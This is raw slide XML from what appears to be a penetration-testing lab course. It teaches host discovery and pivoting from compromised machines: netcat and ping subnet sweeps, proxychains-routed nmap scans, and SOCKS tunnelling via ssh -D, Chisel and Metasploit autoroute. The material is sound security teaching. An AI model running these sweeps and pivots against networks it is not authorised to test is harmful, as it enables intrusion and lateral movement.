                </a:solidFill>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 22 80 445 3389 2&gt;&amp;1 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>grep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> open</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>done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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Or One liner is the best practice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2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> in 192.168.1.{1..254}; do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>zv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> "$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>" 22 80 445 3389 2&gt;&amp;1 | grep open; done</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700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Explanation: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Loops through all IPs in subnet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Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>) to check ports: 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22 → SSH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80 → HTTP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445 → SMB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3389 → RDP                    Filters only open ports </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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⚙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>️</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Step-by-step (clean version)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🔹 1. Loop through all IPs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for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> in 192.168.1.{1..254}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/>
              <a:t>👉 This generates:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty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192.168.1.1 → 192.168.1.254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/>
              <a:t>👉 Meaning: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“Check every possible device in this network”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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354315E-8543-4D54-95D5-7A4D581A3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0400" y="29453"/>
            <a:ext cx="6451600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other local networks are not shown! Then check for local networks 1. Check if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nmap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installed</a:t>
            </a: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which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nmap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If it is, you can discover live hosts on your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/24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subnet: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nmap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192.168.1.0/24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 on this older version of Nmap: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nmap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sP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192.168.1.0/24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is the easiest approach if available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you are on a bridged network it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>will print all those connected devices even outside of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>vmware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>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F4B925-FBA7-4C31-8068-7BFF5C1B7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400" y="2737887"/>
            <a:ext cx="5849166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852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156200" cy="68580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🔹 2. Run scan for each IP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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>zv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 22 80 445 3389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/>
              <a:t>👉 This checks if these ports are open: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/>
              <a:t>👉 It does NOT connect fully — just checks availability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00" b="1" dirty="0"/>
              <a:t>3. Clean the output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2&gt;&amp;1 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>grep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> open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/>
              <a:t>👉 What this does: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Combines all output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Filters only useful results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👉 So instead of noise, you see:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS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192.168.1.10:80 open</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.15:445 open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17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804618"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="997679"/>
          <a:ext cx="4296229" cy="1876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141">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1959618292"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2982088">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3040202706"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="3752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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Port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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Purpose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2050621"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3752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700">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>22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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SSH (Linux access)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5638627"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3752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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>80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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Web server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713492"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3752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700">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>445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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SMB (Windows file sharing)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5577385"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3752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700">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>3389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700" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>RDP (Remote Desktop)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387692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A064FD2-B8F0-4F7C-AD76-A82ACB6B8FA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6384925" y="223081"/>
            <a:ext cx="4296229" cy="369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4. Repeat for all machines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done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/>
              <a:t>👉 Runs the scan for every IP in the network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Final Result (What you achieve)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After running this, you get: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Active machines in the network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Open ports on each machine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Potential targets for next steps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2650787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/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1" y="38071"/>
            <a:ext cx="8216900" cy="6781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Method 1</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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for windows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Ping Sweep (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>(inside the compromised shell of windows 7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Use the compromised machine to quickly discover which systems are online inside the network.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Host discovery</a:t>
            </a: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for /L %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in (1,1,254) do @ping -n 1 192.168.1.%i | find "Reply"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700" b="1" i="1" dirty="0"/>
              <a:t>Port checking (basic)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/L %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1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7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(1,1,254) do @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1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powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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-Command "Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1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NetConnection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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192.168.1.%i -Port 445"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1F4D78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🎯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1F4D78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What it does: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Checks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which IPs respond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Identifies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alive hosts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1F4D78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🧠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1F4D78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Output example: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192.168.1.10 is alive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192.168.1.15 is alive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1F4D78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1F4D78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Purpose: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“Who is online in the network?”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9BBE35-F87A-420F-BF23-AD35A41A10E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8216901" y="0"/>
            <a:ext cx="4562475" cy="4611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🔹</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 1. Loop through all IPs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for /L %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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in (1,1,254)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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 This generates: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192.168.1.1 → 192.168.1.254</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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 Meaning: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“Check every device in this network range”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🔹</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 2. Send a ping to each IP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ping -n 1 192.168.1.%i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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 Sends </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1 ping request</a:t>
            </a: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 to each IP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altLang="en-US" sz="18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sz="18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1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A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Targets for further scanning</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2750799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B38BA11-4603-4BCB-988F-2414BF99C0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2860"/>
            <a:ext cx="589135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Successful hosts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</a:rPr>
              <a:t>Reply from 192.168.1.1: bytes=32 time=7ms TTL=64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successful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 line like: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Reply from 192.168.1.50: Destination host unreachable.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❌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not a successful ping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D46AB4-4977-42DC-8FD8-C2520FC01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356" y="22860"/>
            <a:ext cx="7251474" cy="626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085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68580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🔹</a:t>
            </a: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 3. Filter only successful responses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| find "Reply"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 Shows only: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 that responded </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700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 Example output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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Reply from 192.168.1.10 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  <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> IP address of the machine 2 inside the network of the target machine</a:t>
            </a:r>
            <a:b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Reply from 192.168.1.25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🔹</a:t>
            </a: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 4. Repeat for all IPs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do ...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 Runs the process for every IP automatically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🧬</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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Final Result (What you achieve)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 List of </a:t>
            </a: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alive machines</a:t>
            </a:r>
            <a:b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 Quick view of active network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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 Unicode MS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42D4052-867E-454D-9B97-217F6152E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-148903"/>
            <a:ext cx="7416800" cy="7155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SOCKS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stands for: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cket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a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network protocol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 allows one computer (the client) to send its network traffic through another computer (the SOCKS server/proxy).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Think of it as a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traffic forwarder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It doesn't inspect or understand the application data—it simply relays connections between the client and the destination.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Without SOCKS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Kali --------------------&gt; Target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Kali connects directly to the target.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SOCKS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Kali -----&gt; SOCKS Proxy -----&gt; Target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SOCKS proxy forwards the connection.</a:t>
            </a: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Why is it called "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SocketS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"?</a:t>
            </a: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socket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is an endpoint used by applications to communicate over a network.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For example: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web browser creates a TCP socket to connect to a web server. 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SSH creates a TCP socket to connect to a remote machine. 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Nmap's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-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sT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scan uses TCP sockets. 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 SOCKS proxy sits between these sockets and forwards the traffic.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144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D3FC0-13AF-4C6A-A076-7800D6083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0"/>
            <a:ext cx="6056086" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"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b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔥 Method 3 — Scan from Kali via Pivot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b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Command: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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> 192.168.1.10  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800" dirty="0"/>
              <a:t>192.168.1.10 = an internal target machine (Machine2)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You discover it earlier using:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="28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b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔ On Machine1 (Windows/Linux):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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t> 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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> neigh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t> 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ping sweep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👉 Example result might had been pretty much like this from the previous step 1:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="Arial Unicode MS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>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.10</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.15</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.20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3BFEF-1802-4521-B4A4-47223DCBE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217" cy="587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25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DCE3F9-8B90-4665-8A4C-EC3342FD56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092" y="188685"/>
            <a:ext cx="8916359" cy="4591155"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1125035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51231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What it does:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sends scan traffic from Kali </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Routes it through Machine1 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Targets internal systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Method 4: Static Nmap </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>on compromised </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2 Linux shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> +x nmap</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -sT -p 80,445,3389 192.168.1.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 Outcome:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Find Machine 2 + open services (SMB, RDP, SSH)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1022239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955" y="365125"/>
            <a:ext cx="11267767" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 02: Pivoting &amp; Tunneling (The "Double Jump")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90689"/>
            <a:ext cx="12192000" cy="5167312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: Set up a tunnel so your attack machine (Kali) can talk to a second internal machine through the first compromised host. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t>SOCKS Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: Set up a SOCKS proxy using SSH Dynamic Port Forwarding (ssh -D) or tools like Chisel. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t>Proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: Configure proxychains on your Kali machine to route your tools (like Nmap or Burp Suite) through the established tunnel. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t> Metasploit Autoroute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: Practice using the autoroute post-module and SOCKS4a server inside Metasploit. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0"/>
              <a:t>: Mastering the concept of "Routing" traffic through a compromised gateway to reach deep internal targets. </a:t>
            </a:r>
          </a:p>
          <a:p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135043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667828" cy="6477907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dirty="0"/>
              <a:t>Set up a tunnel so your attack machine (Kali) can talk to a second internal machine through the first compromised host.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 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>SSH Pivot </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Note </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Proxychains and tools (nmap, curl, firefox) are ALWAYS run on Kali, not inside Meterpreter compromised shells of the targets.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dirty="0"/>
